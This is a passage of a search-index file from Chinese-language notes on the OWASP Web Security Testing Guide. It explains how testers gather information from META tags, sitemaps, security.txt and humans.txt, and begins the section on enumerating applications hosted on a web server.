\u7f51\u7ad9\u7ad9\u957f\u5de5\u5177\u3002</li> <li>\u5728\u4eea\u8868\u677f\u4e0a\uff0c\u8f93\u5165\u8981\u5206\u6790\u7684\u7ad9\u70b9\u7684 URL\u3002</li> <li>\u5728\u53ef\u7528\u65b9\u6cd5\u4e4b\u95f4\u8fdb\u884c\u9009\u62e9\uff0c\u7136\u540e\u6309\u7167\u5c4f\u5e55\u4e0a\u7684\u8bf4\u660e\u8fdb\u884c\u64cd\u4f5c\u3002</li> </ol>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/WEB%20Guide/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/#_14","title":"\u5143\u6807\u7b7e","text":"<p><code>&lt;META&gt;</code>\u6807\u8bb0\u4f4d\u4e8e<code>HEAD</code>\u6bcf\u4e2a HTML \u6587\u6863\u7684\u90e8\u5206\u5185\uff0c\u5e76\u4e14\u5728\u673a\u5668\u4eba/\u8718\u86db/\u722c\u866b\u8d77\u70b9\u4e0d\u662f\u4ece webroot \u4ee5\u5916\u7684\u6587\u6863\u94fe\u63a5\uff08\u5373\u6df1\u5c42\u94fe\u63a5\uff09\u5f00\u59cb\u7684\u60c5\u51b5\u4e0b\uff0c\u5e94\u8be5\u5728\u6574\u4e2a\u7f51\u7ad9\u4e0a\u4fdd\u6301\u4e00\u81f4\u3002Robots \u6307\u4ee4\u4e5f\u53ef\u4ee5\u901a\u8fc7\u4f7f\u7528\u7279\u5b9a\u7684META \u6807\u8bb0\u6765\u6307\u5b9a\u3002</p>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/WEB%20Guide/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/#meta","title":"\u673a\u5668\u4eba META \u6807\u7b7e","text":"<p>\u5982\u679c\u6ca1\u6709<code>&lt;META NAME=\"ROBOTS\" ... &gt;</code>\u6761\u76ee\uff0c\u5219\u201c\u673a\u5668\u4eba\u6392\u9664\u534f\u8bae\u201d\u9ed8\u8ba4\u4e3a<code>INDEX,FOLLOW</code>\u5206\u522b\u3002\u56e0\u6b64\uff0c\u201c\u673a\u5668\u4eba\u6392\u9664\u534f\u8bae\u201d\u5b9a\u4e49\u7684\u53e6\u5916\u4e24\u4e2a\u6709\u6548\u6761\u76ee\u4ee5<code>NO...</code>ie<code>NOINDEX</code>\u548c\u4e3a\u524d\u7f00<code>NOFOLLOW</code>\u3002</p> <p>\u6839\u636e webroot \u6587\u4ef6\u4e2d\u5217\u51fa\u7684 Disallow \u6307\u4ee4\uff0c\u5728\u6bcf\u4e2a\u7f51\u9875\u4e2d\u8fdb\u884c<code>robots.txt</code>\u6b63\u5219\u8868\u8fbe\u5f0f\u641c\u7d22\uff0c\u5e76\u5c06\u7ed3\u679c\u4e0e\u200b\u200b webroot \u4e2d\u7684\u6587\u4ef6\u8fdb\u884c\u6bd4\u8f83\u3002<code>&lt;META NAME=\"ROBOTS\"``robots.txt</code></p>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/WEB%20Guide/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/#_15","title":"\u6742\u9879\u5143\u4fe1\u606f\u6807\u7b7e","text":"<p>\u7ec4\u7ec7\u7ecf\u5e38\u5728 Web \u5185\u5bb9\u4e2d\u5d4c\u5165\u4fe1\u606f META \u6807\u7b7e\u4ee5\u652f\u6301\u5404\u79cd\u6280\u672f\uff0c\u4f8b\u5982\u5c4f\u5e55\u9605\u8bfb\u5668\u3001\u793e\u4ea4\u7f51\u7edc\u9884\u89c8\u3001\u641c\u7d22\u5f15\u64ce\u7d22\u5f15\u7b49\u3002\u6b64\u7c7b\u5143\u4fe1\u606f\u5bf9\u4e8e\u6d4b\u8bd5\u4eba\u5458\u8bc6\u522b\u6240\u4f7f\u7528\u7684\u6280\u672f\u4ee5\u53ca\u8981\u63a2\u7d22\u7684\u5176\u4ed6\u8def\u5f84/\u529f\u80fd\u53ef\u80fd\u5f88\u6709\u4ef7\u503c\u548c\u6d4b\u8bd5\u3002\u4ee5\u4e0b\u5143\u4fe1\u606f\u662f<code>www.whitehouse.gov</code>\u5728 2020 \u5e74 5 \u6708 5 \u65e5\u901a\u8fc7\u67e5\u770b\u9875\u9762\u6e90\u68c0\u7d22\u5230\u7684\uff1a</p> <pre><code>...\n&lt;meta property=\"og:locale\" content=\"en_US\" /&gt;\n&lt;meta property=\"og:type\" content=\"website\" /&gt;\n&lt;meta property=\"og:title\" content=\"The White House\" /&gt;\n&lt;meta property=\"og:description\" content=\"We, the citizens of America, are now joined in a great national effort to rebuild our country and to restore its promise for all. \u2013 President Donald Trump.\" /&gt;\n&lt;meta property=\"og:url\" content=\"https://www.whitehouse.gov/\" /&gt;\n&lt;meta property=\"og:site_name\" content=\"The White House\" /&gt;\n&lt;meta property=\"fb:app_id\" content=\"1790466490985150\" /&gt;\n&lt;meta property=\"og:image\" content=\"https://www.whitehouse.gov/wp-content/uploads/2017/12/wh.gov-share-img_03-1024x538.png\" /&gt;\n&lt;meta property=\"og:image:secure_url\" content=\"https://www.whitehouse.gov/wp-content/uploads/2017/12/wh.gov-share-img_03-1024x538.png\" /&gt;\n&lt;meta name=\"twitter:card\" content=\"summary_large_image\" /&gt;\n&lt;meta name=\"twitter:description\" content=\"We, the citizens of America, are now joined in a great national effort to rebuild our country and to restore its promise for all. \u2013 President Donald Trump.\" /&gt;\n&lt;meta name=\"twitter:title\" content=\"The White House\" /&gt;\n&lt;meta name=\"twitter:site\" content=\"@whitehouse\" /&gt;\n&lt;meta name=\"twitter:image\" content=\"https://www.whitehouse.gov/wp-content/uploads/2017/12/wh.gov-share-img_03-1024x538.png\" /&gt;\n&lt;meta name=\"twitter:creator\" content=\"@whitehouse\" /&gt;\n...\n&lt;meta name=\"apple-mobile-web-app-title\" content=\"The White House\"&gt;\n&lt;meta name=\"application-name\" content=\"The White House\"&gt;\n&lt;meta name=\"msapplication-TileColor\" content=\"#0c2644\"&gt;\n&lt;meta name=\"theme-color\" content=\"#f5f5f5\"&gt;\n...\n</code></pre>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/WEB%20Guide/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/#_16","title":"\u7ad9\u70b9\u5730\u56fe","text":"<p>\u7ad9\u70b9\u5730\u56fe\u662f\u4e00\u4e2a\u6587\u4ef6\uff0c\u5f00\u53d1\u4eba\u5458\u6216\u7ec4\u7ec7\u53ef\u4ee5\u5728\u5176\u4e2d\u63d0\u4f9b\u6709\u5173\u7ad9\u70b9\u6216\u5e94\u7528\u7a0b\u5e8f\u63d0\u4f9b\u7684\u9875\u9762\u3001\u89c6\u9891\u548c\u5176\u4ed6\u6587\u4ef6\u7684\u4fe1\u606f\uff0c\u4ee5\u53ca\u5b83\u4eec\u4e4b\u95f4\u7684\u5173\u7cfb\u3002\u641c\u7d22\u5f15\u64ce\u53ef\u4ee5\u4f7f\u7528\u6b64\u6587\u4ef6\u66f4\u667a\u80fd\u5730\u63a2\u7d22\u60a8\u7684\u7f51\u7ad9\u3002\u6d4b\u8bd5\u4eba\u5458\u53ef\u4ee5\u4f7f\u7528<code>sitemap.xml</code>\u6587\u4ef6\u6765\u4e86\u89e3\u6709\u5173\u7ad9\u70b9\u6216\u5e94\u7528\u7a0b\u5e8f\u7684\u66f4\u591a\u4fe1\u606f\uff0c\u4ece\u800c\u66f4\u5168\u9762\u5730\u63a2\u7d22\u5b83\u3002</p> <p>\u4ee5\u4e0b\u6458\u5f55\u81ea 2020 \u5e74 5 \u6708 5 \u65e5\u68c0\u7d22\u5230\u7684 Google \u4e3b\u8981\u7ad9\u70b9\u5730\u56fe\u3002</p> <pre><code>$ wget --no-verbose https://www.google.com/sitemap.xml &amp;&amp; head -n8 sitemap.xml\n2020-05-05 12:23:30 URL:https://www.google.com/sitemap.xml [2049] -&gt; \"sitemap.xml\" [1]\n\n&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;\n&lt;sitemapindex xmlns=\"http://www.google.com/schemas/sitemap/0.84\"&gt;\n  &lt;sitemap&gt;\n    &lt;loc&gt;https://www.google.com/gmail/sitemap.xml&lt;/loc&gt;\n  &lt;/sitemap&gt;\n  &lt;sitemap&gt;\n    &lt;loc&gt;https://www.google.com/forms/sitemaps.xml&lt;/loc&gt;\n  &lt;/sitemap&gt;\n...\n</code></pre> <p>\u6d4b\u8bd5\u4eba\u5458\u53ef\u80fd\u5e0c\u671b\u4ece\u90a3\u91cc\u63a2\u7d22\u4ee5\u68c0\u7d22 gmail \u7ad9\u70b9\u5730\u56fe<code>https://www.google.com/gmail/sitemap.xml</code>\uff1a</p> <pre><code>&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;\n&lt;urlset xmlns=\"http://www.sitemaps.org/schemas/sitemap/0.9\" xmlns:xhtml=\"http://www.w3.org/1999/xhtml\"&gt;\n  &lt;url&gt;\n    &lt;loc&gt;https://www.google.com/intl/am/gmail/about/&lt;/loc&gt;\n    &lt;xhtml:link href=\"https://www.google.com/gmail/about/\" hreflang=\"x-default\" rel=\"alternate\"/&gt;\n    &lt;xhtml:link href=\"https://www.google.com/intl/el/gmail/about/\" hreflang=\"el\" rel=\"alternate\"/&gt;\n    &lt;xhtml:link href=\"https://www.google.com/intl/it/gmail/about/\" hreflang=\"it\" rel=\"alternate\"/&gt;\n    &lt;xhtml:link href=\"https://www.google.com/intl/ar/gmail/about/\" hreflang=\"ar\" rel=\"alternate\"/&gt;\n...\n</code></pre>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/WEB%20Guide/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/#txt","title":"\u5b89\u5168TXT","text":"<p>security.txt\u88ab IETF \u6279\u51c6\u4e3aRFC 9116 - \u4e00\u79cd\u6709\u52a9\u4e8e\u5b89\u5168\u6f0f\u6d1e\u62ab\u9732\u7684\u6587\u4ef6\u683c\u5f0f\uff0c\u5141\u8bb8\u7f51\u7ad9\u5b9a\u4e49\u5b89\u5168\u7b56\u7565\u548c\u8054\u7cfb\u65b9\u5f0f\u3002\u6709\u591a\u79cd\u539f\u56e0\u53ef\u80fd\u5bf9\u6d4b\u8bd5\u573a\u666f\u611f\u5174\u8da3\uff0c\u5305\u62ec\u4f46\u4e0d\u9650\u4e8e\uff1a</p> <ul> <li>\u8bc6\u522b\u8fdb\u4e00\u6b65\u7684\u8def\u5f84\u6216\u8d44\u6e90\u4ee5\u5305\u542b\u5728\u53d1\u73b0/\u5206\u6790\u4e2d\u3002</li> <li>\u5f00\u6e90\u60c5\u62a5\u6536\u96c6\u3002</li> <li>\u67e5\u627e\u6709\u5173 Bug Bounties \u7b49\u7684\u4fe1\u606f\u3002</li> <li>\u793e\u4f1a\u5de5\u7a0b\u5b66\u3002</li> </ul> <p>\u8be5\u6587\u4ef6\u53ef\u80fd\u5b58\u5728\u4e8e\u7f51\u7edc\u670d\u52a1\u5668\u7684\u6839\u76ee\u5f55\u4e2d\u6216<code>.well-known/</code>\u76ee\u5f55\u4e2d\u3002\u524d\u4efb\uff1a</p> <ul> <li><code>https://example.com/security.txt</code></li> <li><code>https://example.com/.well-known/security.txt</code></li> </ul> <p>\u8fd9\u662f\u4ece LinkedIn 2020 \u5e74 5 \u6708 5 \u65e5\u68c0\u7d22\u5230\u7684\u771f\u5b9e\u793a\u4f8b\uff1a</p> <pre><code>$ wget --no-verbose https://www.linkedin.com/.well-known/security.txt &amp;&amp; cat security.txt\n2020-05-07 12:56:51 URL:https://www.linkedin.com/.well-known/security.txt [333/333] -&gt; \"security.txt\" [1]\n# Conforms to IETF `draft-foudil-securitytxt-07`\nContact: mailto:security@linkedin.com\nContact: https://www.linkedin.com/help/linkedin/answer/62924\nEncryption: https://www.linkedin.com/help/linkedin/answer/79676\nCanonical: https://www.linkedin.com/.well-known/security.txt\nPolicy: https://www.linkedin.com/help/linkedin/answer/62924\n</code></pre>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/WEB%20Guide/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/#txt_1","title":"\u4eba\u7c7b TXT","text":"<p><code>humans.txt</code>\u662f\u4e00\u4e2a\u4e86\u89e3\u7f51\u7ad9\u80cc\u540e\u7684\u4eba\u7684\u5021\u8bae\u3002\u5b83\u91c7\u7528\u6587\u672c\u6587\u4ef6\u7684\u5f62\u5f0f\uff0c\u5176\u4e2d\u5305\u542b\u6709\u5173\u4e3a\u6784\u5efa\u7f51\u7ad9\u505a\u51fa\u8d21\u732e\u7684\u4e0d\u540c\u4eba\u5458\u7684\u4fe1\u606f\u3002\u8be5\u6587\u4ef6\u901a\u5e38\uff08\u4f46\u4e0d\u603b\u662f\uff09\u5305\u542b\u6709\u5173\u804c\u4e1a\u6216\u5de5\u4f5c\u5730\u70b9/\u8def\u5f84\u7684\u4fe1\u606f\u3002</p> <p>\u4ee5\u4e0b\u793a\u4f8b\u68c0\u7d22\u81ea Google 2020 \u5e74 5 \u6708 5 \u65e5\uff1a</p> <pre><code>$ wget --no-verbose  https://www.google.com/humans.txt &amp;&amp; cat humans.txt\n2020-05-07 12:57:52 URL:https://www.google.com/humans.txt [286/286] -&gt; \"humans.txt\" [1]\nGoogle is built by a large team of engineers, designers, researchers, robots, and others in many different sites across the globe. It is updated continuously, and built with more tools and technologies than we can shake a stick at. If you'd like to help us out, see careers.google.com.\n</code></pre>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/WEB%20Guide/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/#_17","title":"\u5176\u4ed6\u4f17\u6240\u5468\u77e5\u7684\u4fe1\u606f\u6765\u6e90","text":"<p>\u8fd8\u6709\u5176\u4ed6 RFC \u548c Internet \u8349\u6848\u5efa\u8bae\u5728<code>.well-known/</code>\u76ee\u5f55\u4e2d\u5bf9\u6587\u4ef6\u8fdb\u884c\u6807\u51c6\u5316\u4f7f\u7528\u3002\u53ef\u4ee5\u5728\u6b64\u5904\u6216\u6b64\u5904\u627e\u5230\u5176\u4e2d\u7684\u5217\u8868\u3002</p> <p>\u6d4b\u8bd5\u4eba\u5458\u67e5\u770b RFC/\u8349\u7a3f\u5e76\u521b\u5efa\u4e00\u4e2a\u5217\u8868\u4ee5\u63d0\u4f9b\u7ed9\u722c\u866b\u6216\u6a21\u7cca\u5668\uff0c\u4ee5\u9a8c\u8bc1\u6b64\u7c7b\u6587\u4ef6\u7684\u5b58\u5728\u6216\u5185\u5bb9\uff0c\u8fd9\u5c06\u662f\u76f8\u5f53\u7b80\u5355\u7684\u3002</p>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/WEB%20Guide/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/#_18","title":"\u5de5\u5177","text":"<ul> <li>\u6d4f\u89c8\u5668\uff08\u67e5\u770b\u6e90\u4ee3\u7801\u6216\u5f00\u53d1\u5de5\u5177\u529f\u80fd\uff09</li> <li>\u5377\u66f2</li> <li>wget</li> <li>\u6253\u55dd\u5957\u4ef6</li> <li>ZAP</li> </ul>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/WEB%20Guide/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/#web","title":"\u679a\u4e3e Web \u670d\u52a1\u5668\u4e0a\u7684\u5e94\u7528\u7a0b\u5e8f","text":"<p>https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/01-Information_Gathering/04-Enumerate_Applications_on_Webserver</p>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/WEB%20Guide/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/#_19","title":"\u6982\u62ec","text":"<p>\u6d4b\u8bd5 Web \u5e94\u7528\u7a0b\u5e8f\u6f0f\u6d1e\u7684\u6700\u91cd\u8981\u6b65\u9aa4\u662f\u627e\u51fa Web \u670d\u52a1\u5668\u4e0a\u6258\u7ba1\u4e86\u54ea\u4e9b\u7279\u5b9a\u5e94\u7528\u7a0b\u5e8f\u3002\u8bb8\u591a\u5e94\u7528\u7a0b\u5e8f\u90fd\u6709\u5df2\u77e5\u7684\u6f0f\u6d1e\u548c\u5df2\u77e5\u7684\u653b\u51fb\u7b56\u7565\uff0c\u53ef\u4ee5\u5229\u7528\u8fd9\u4e9b\u6f0f\u6d1e\u548c\u653b\u51fb\u7b56\u7565\u6765\u83b7\u5f97\u8fdc\u7a0b\u63a7\u5236\u6216\u5229\u7528\u6570\u636e\u3002\u6b64\u5916\uff0c\u8bb8\u591a\u5e94\u7528\u7a0b\u5e8f\u7ecf\u5e38\u914d\u7f6e\u9519\u8bef\u6216\u672a\u66f4\u65b0\uff0c\u56e0\u4e3a\u4eba\u4eec\u8ba4\u4e3a\u5b83\u4eec\u4ec5\u5728\u201c\u5185\u200b\u200b\u90e8\u201d\u4f7f\u7528\uff0c\u56e0\u6b64\u4e0d\u5b58\u5728\u5a01\u80c1\u200b\u200b\u3002\u968f\u7740\u865a\u62df Web \u670d\u52a1\u5668\u7684\u6fc0\u589e\uff0cIP \u5730\u5740\u548c Web \u670d\u52a1\u5668\u4e4b\u95f4\u4f20\u7edf\u7684 1:1 \u5173\u7cfb\u6b63\u5728\u5931\u53bb\u5176\u539f\u6709\u7684\u5927\u90e8\u5206\u610f\u4e49\u3002\u591a\u4e2a\u7f51\u7ad9\u6216\u5e94\u7528\u7a0b\u5e8f\u7684\u7b26\u53f7\u540d\u79f0\u89e3\u6790\u4e3a\u540c\u4e00 IP \u5730\u5740\u7684\u60c5\u51b5\u5e76\u4e0d\u5c11\u89c1\u3002\u8fd9\u79cd\u573a\u666f\u4e0d\u4ec5\u9650\u4e8e\u6258\u7ba1\u73af\u5883\uff0c\u4e5f\u9002\u7528\u4e8e\u666e\u901a\u7684\u4f01\u4e1a\u73af\u5883\u3002</p> <p>\u5b89\u5168\u4e13\u4e1a\u4eba\u5458\u6709\u65f6\u4f1a\u83b7\u5f97\u4e00\u7ec4 IP \u5730\u5740\u4f5c\u4e3a\u6d4b\u8bd5\u76ee\u6807\u3002\u6709\u4e89\u8bae\u7684\u662f\uff0c\u6b64\u573a\u666f\u66f4\u7c7b\u4f3c\u4e8e\u6e17\u900f\u6d4b\u8bd5\u7c7b\u578b\u7684\u53c2\u4e0e\uff0c\u4f46\u65e0\u8bba\u5982\u4f55\uff0c\u9884\u8ba1\u6b64\u7c7b\u4efb\u52a1\u5c06\u6d4b\u8bd5\u53ef\u901a\u8fc7\u6b64\u76ee\u6807\u8bbf\u95ee\u7684\u6240\u6709 Web \u5e94\u7528\u7a0b\u5e8f\u3002\u95ee\u9898\u662f\u7ed9\u5b9a\u7684 IP \u5730\u5740\u5728\u7aef\u53e3 80 \u4e0a\u6258\u7ba1 HTTP \u670d\u52a1\uff0c\u4f46\u662f\u5982\u679c\u6d4b\u8bd5\u4eba\u5458\u5e94\u8be5\u901a\u8fc7\u6307\u5b9a IP \u5730\u5740\uff08\u8fd9\u662f\u4ed6\u4eec\u6240\u77e5\u9053\u7684\uff09\u8bbf\u95ee\u5b83\uff0c\u5b83\u4f1a\u62a5\u544a\u201c\u6b64\u5730\u5740\u672a\u914d\u7f6e Web \u670d\u52a1\u5668\u201d\u6216\u7c7b\u4f3c\u6d88\u606f.\u00a0\u4f46\u662f\u8be5\u7cfb\u7edf\u53ef\u4ee5\u201c\u9690\u85cf\u201d\u8bb8\u591a\u4e0e\u4e0d\u76f8\u5173\u7684\u7b26\u53f7 (DNS) \u540d\u79f0\u5173\u8054\u7684 Web \u5e94\u7528\u7a0b\u5e8f\u3002\u663e\u7136\uff0c\u5206\u6790\u7684\u8303\u56f4\u6df1\u53d7\u6d4b\u8bd5\u4eba\u5458\u6d4b\u8bd5\u6240\u6709\u5e94\u7528\u7a0b\u5e8f\u6216\u53ea\u6d4b\u8bd5\u4ed6\u4eec\u77e5\u9053\u7684\u5e94\u7528\u7a0b\u5e8f\u7684\u5f71\u54cd\u3002</p> <p>\u6709\u65f6\uff0c\u76ee\u6807\u89c4\u8303\u66f4\u4e30\u5bcc\u3002\u6d4b\u8bd5\u4eba\u5458\u53ef\u80fd\u4f1a\u5f97\u5230\u4e00\u4e2a IP \u5730\u5740\u5217\u8868\u53ca\u5176\u76f8\u5e94\u7684\u7b26\u53f7\u540d\u79f0\u3002\u7136\u800c\uff0c\u8fd9\u4e2a\u5217\u8868\u53ef\u80fd\u4f20\u8fbe\u4e86\u90e8\u5206\u4fe1\u606f\uff0c\u5373\u5b83\u53ef\u80fd\u7701\u7565\u4e86\u4e00\u4e9b\u7b26\u53f7\u540d\u79f0\uff0c\u800c\u5ba2\u6237\u751a\u81f3\u53ef\u80fd\u6ca1\u6709\u610f\u8bc6\u5230\u8fd9\u4e00\u70b9\uff08\u8fd9\u5728\u5927\u578b\u7ec4\u7ec7\u4e2d\u66f4\u6709\u53ef\u80fd\u53d1\u751f\uff09\u3002</p> <p>\u5f71\u54cd\u8bc4\u4f30\u8303\u56f4\u7684\u5176\u4ed6\u95ee\u9898\u7531\u5728\u975e\u660e\u663e URL\uff08\u4f8b\u5982\uff0c<code>http://www.example.com/some-strange-URL</code>\uff09\u4e0a\u53d1\u5e03\u7684 Web \u5e94\u7528\u7a0b\u5e8f\u8868\u793a\uff0c\u8fd9\u4e9b URL \u672a\u5728\u5176\u4ed6\u5730\u65b9\u5f15\u7528\u3002\u8fd9\u53ef\u80fd\u662f\u7531\u4e8e\u9519\u8bef\uff08\u7531\u4e8e\u914d\u7f6e\u9519\u8bef\uff09\u6216\u6709\u610f\uff08\u4f8b\u5982\uff0c\u672a\u516c\u5e03\u7684\u7ba1\u7406\u754c\u9762\uff09\u9020\u6210\u7684\u3002</p> <p>\u4e3a\u4e86\u89e3\u51b3\u8fd9\u4e9b\u95ee\u9898\uff0c\u6709\u5fc5\u8981\u6267\u884c Web \u5e94\u7528\u7a0b\u5e8f\u53d1\u73b0\u3002</p>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/WEB%20Guide/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/#_20","title":"\u6d4b\u8bd5\u76ee\u6807","text":"<ul> <li>\u679a\u4e3e\u8303\u56f4\u5185\u5b58\u5728\u4e8e Web \u670d\u52a1\u5668\u4e0a\u7684\u5e94\u7528\u7a0b\u5e8f\u3002</li> </ul>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/WEB%20Guide/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/#_21","title":"\u5982\u4f55\u6d4b\u8bd5","text":"<p>Web \u5e94\u7528\u7a0b\u5e8f\u53d1\u73b0\u662f\u4e00\u4e2a\u65e8\u5728\u8bc6\u522b\u7ed9\u5b9a\u57fa\u7840\u67b6\u6784\u4e0a\u7684 Web \u5e94\u7528\u7a0b\u5e8f\u7684\u8fc7\u7a0b\u3002\u540e\u8005\u901a\u5e38\u6307\u5b9a\u4e3a\u4e00\u7ec4 IP \u5730\u5740\uff08\u53ef\u80fd\u662f\u4e00\u4e2a\u7f51\u7edc\u5757\uff09\uff0c\u4f46\u4e5f\u53ef\u80fd\u5305\u542b\u4e00\u7ec4 DNS \u7b26\u53f7\u540d\u79f0\u6216\u4e24\u8005\u7684\u6df7\u5408\u3002\u8fd9\u4e9b\u4fe1\u606f\u5728\u8bc4\u4f30\u6267\u884c\u4e4b\u524d\u5206\u53d1\uff0c\u65e0\u8bba\u662f\u7ecf\u5178\u98ce\u683c\u7684\u6e17\u900f\u6d4b\u8bd5\u8fd8\u662f\u4ee5\u5e94\u7528\u7a0b\u5e8f\u4e3a\u4e2d\u5fc3\u7684\u8bc4\u4f30\u3002\u5728\u8fd9\u4e24\u79cd\u60c5\u51b5\u4e0b\uff0c\u9664\u975e\u53c2\u4e0e\u89c4\u5219\u53e6\u6709\u89c4\u5b9a\uff08\u4f8b\u5982\uff0c\u4ec5\u6d4b\u8bd5\u4f4d\u4e8e URL \u7684\u5e94\u7528\u7a0b\u5e8f<code>http://www.example.com/</code>\uff09\uff0c\u5426\u5219\u8bc4\u4f30\u5e94\u529b\u6c42\u8303\u56f4\u6700\u5168\u9762\uff0c\u5373\u5b83\u5e94\u8bc6\u522b\u53ef\u901a\u8fc7\u7ed9\u5b9a\u76ee\u6807\u8bbf\u95ee\u7684\u6240\u6709\u5e94\u7528\u7a0b\u5e8f\u3002\u4ee5\u4e0b\u793a\u4f8b\u68c0\u67e5\u4e86\u53ef\u7528\u4e8e\u5b9e\u73b0\u6b64\u76ee\u6807\u7684\u4e00\u4e9b\u6280\u672f\u3002</p> <p>\u4ee5\u4e0b\u4e00\u4e9b\u6280\u672f\u9002\u7528\u4e8e\u9762\u5411 Internet \u7684 Web \u670d\u52a1\u5668\uff0c\u5373 DNS \u548c\u53cd\u5411 IP \u57fa\u4e8e Web \u7684\u641c\u7d22\u670d\u52a1\u4ee5\u53ca\u641c\u7d22\u5f15\u64ce\u7684\u4f7f\u7528\u3002\u793a\u4f8b\u4f7f\u7528\u79c1\u6709 IP \u5730\u5740\uff08\u4f8b\u5982<code>192.168.1.100</code>\uff09\uff0c\u9664\u975e\u53e6\u6709\u8bf4\u660e\uff0c\u5426\u5219\u4ee3\u8868_\u901a\u7528_IP \u5730\u5740\u5e76\u4e14\u4ec5\u7528\u4e8e\u533f\u540d\u76ee\u7684\u3002</p> <p>\u5f71\u54cd\u6709\u591a\u5c11\u5e94\u7528\u7a0b\u5e8f\u4e0e\u7ed9\u5b9a DNS \u540d\u79f0\uff08\u6216 IP \u5730\u5740\uff09\u76f8\u5173\u7684\u4e09\u4e2a\u56e0\u7d20\uff1a</p> <ol> <li> <p>\u4e0d\u540c\u7684\u57fa\u672c URL</p> <p>Web \u5e94\u7528\u7a0b\u5e8f\u7684\u660e\u663e\u5165\u53e3\u70b9\u662f<code>www.example.com</code>\uff0c\u5373\uff0c\u4f7f\u7528\u8fd9\u79cd\u7b80\u5199\u7b26\u53f7\uff0c\u6211\u4eec\u8ba4\u4e3a Web \u5e94\u7528\u7a0b\u5e8f\u8d77\u6e90\u4e8e<code>http://www.example.com/</code>\uff08\u8fd9\u540c\u6837\u9002\u7528\u4e8e HTTPS\uff09\u3002\u7136\u800c\uff0c\u5373\u4f7f\u8fd9\u662f\u6700\u5e38\u89c1\u7684\u60c5\u51b5\uff0c\u4e5f\u6ca1\u6709\u5f3a\u5236\u5e94\u7528\u7a0b\u5e8f\u4ece<code>/</code>.</p> <p>\u4f8b\u5982\uff0c\u76f8\u540c\u7684\u7b26\u53f7\u540d\u79f0\u53ef\u80fd\u4e0e\u4e09\u4e2a Web \u5e94\u7528\u7a0b\u5e8f\u76f8\u5173\u8054\uff0c\u4f8b\u5982\uff1a<code>http://www.example.com/url1</code> <code>http://www.example.com/url2</code> <code>http://www.example.com/url3</code></p> <p>\u5728\u8fd9\u79cd\u60c5\u51b5\u4e0b\uff0cURL<code>http://www.example.com/</code>\u4e0d\u4f1a\u4e0e\u6709\u610f\u4e49\u7684\u9875\u9762\u76f8\u5173\u8054\uff0c\u5e76\u4e14\u8fd9\u4e09\u4e2a\u5e94\u7528\u7a0b\u5e8f\u5c06\u88ab\u9690\u85cf\uff0c\u9664\u975e\u6d4b\u8bd5\u4eba\u5458\u660e\u786e\u77e5\u9053\u5982\u4f55\u8bbf\u95ee\u5b83\u4eec\uff0c\u5373\u6d4b\u8bd5\u4eba\u5458\u77e5\u9053_url1_\u3001url2_\u6216_url3\u3002\u901a\u5e38\u4e0d\u9700\u8981\u4ee5\u8fd9\u79cd\u65b9\u5f0f\u53d1\u5e03 Web \u5e94\u7528\u7a0b\u5e8f\uff0c\u9664\u975e\u6240\u6709\u8005\u4e0d\u5e0c\u671b\u4ee5\u6807\u51c6\u65b9\u5f0f\u8bbf\u95ee\u5b83\u4eec\uff0c\u5e76\u4e14\u51c6\u5907\u544a\u77e5\u7528\u6237\u5176\u786e\u5207\u4f4d\u7f6e\u3002\u8fd9\u5e76\u4e0d\u610f\u5473\u7740\u8fd9\u4e9b\u5e94\u7528\u7a0b\u5e8f\u662f\u79d8\u5bc6\u7684\uff0c\u53ea\u662f\u5b83\u4eec\u7684\u5b58\u5728\u548c\u4f4d\u7f6e\u6ca1\u6709\u88ab\u660e\u786e\u516c\u5e03\u3002</p> </li> <li> <p>\u975e\u6807\u51c6\u7aef\u53e3</p> <p>\u867d\u7136 Web \u5e94\u7528\u7a0b\u5e8f\u901a\u5e38\u4f4d\u4e8e\u7aef\u53e3 80 (HTTP) \u548c 443 (HTTPS) \u4e0a\uff0c\u4f46\u8fd9\u4e9b\u7aef\u53e3\u53f7\u5e76\u6ca1\u6709\u4ec0\u4e48\u795e\u5947\u4e4b\u5904\u3002\u4e8b\u5b9e\u4e0a\uff0cWeb \u5e94\u7528\u7a0b\u5e8f\u53ef\u80fd\u4e0e\u4efb\u610f TCP \u7aef\u53e3\u76f8\u5173\u8054\uff0c\u5e76\u4e14\u53ef\u4ee5\u901a\u8fc7\u6307\u5b9a\u7aef\u53e3\u53f7\u6765\u5f15\u7528\uff0c\u5982\u4e0b\u6240\u793a\uff1a<code>http[s]://www.example.com:port/</code>.\u00a0\u4f8b\u5982\uff0c<code>http://www.example.com:20000/</code>\u3002</p> </li> <li> <p>\u865a\u62df\u4e3b\u673a</p> <p>DNS \u5141\u8bb8\u5355\u4e2a IP \u5730\u5740\u4e0e\u4e00\u4e2a\u6216\u591a\u4e2a\u7b26\u53f7\u540d\u79f0\u76f8\u5173\u8054\u3002\u4f8b\u5982\uff0cIP \u5730\u5740<code>192.168.1.100</code>\u53ef\u80fd\u4e0e DNS 